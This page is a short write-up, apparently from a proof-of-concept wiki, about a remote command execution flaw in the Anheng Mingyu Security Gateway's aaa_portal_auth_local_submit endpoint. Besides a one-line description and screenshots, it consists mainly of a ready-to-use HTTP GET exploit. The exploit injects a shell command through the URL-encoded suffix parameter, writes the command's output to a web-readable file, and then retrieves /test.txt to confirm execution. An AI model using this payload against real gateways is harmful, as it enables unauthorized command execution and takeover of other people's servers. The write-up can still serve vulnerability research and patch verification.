# Anheng Mingyu Security Gateway aaa_portal_auth_local_submit Remote Command Execution Vulnerability

## Vulnerability Description

Anheng Mingyu Security Gateway aaa_portal_auth_local_submit There is a remote command execution vulnerability, and an attacker can obtain server permissions through the vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Anheng Mingyu Security Gateway</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648357678171-6c786cb6-1bdb-43c0-a94b-4c2ed4ff3cd0.png)

Verify POC

```plain
GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%7B%7Burlenc%28%60id%20%3E%2Fusr%2Flocal%2Fwebui%2Ftest.txt%60%29%7D%7D HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Connection: close
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1692062626150-36022103-f317-4818-bac9-f11851fbd281.png)

```plain
/test.txt
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1692062651462-caaf6133-21b4-4566-947b-a9fe6e2f2502.png)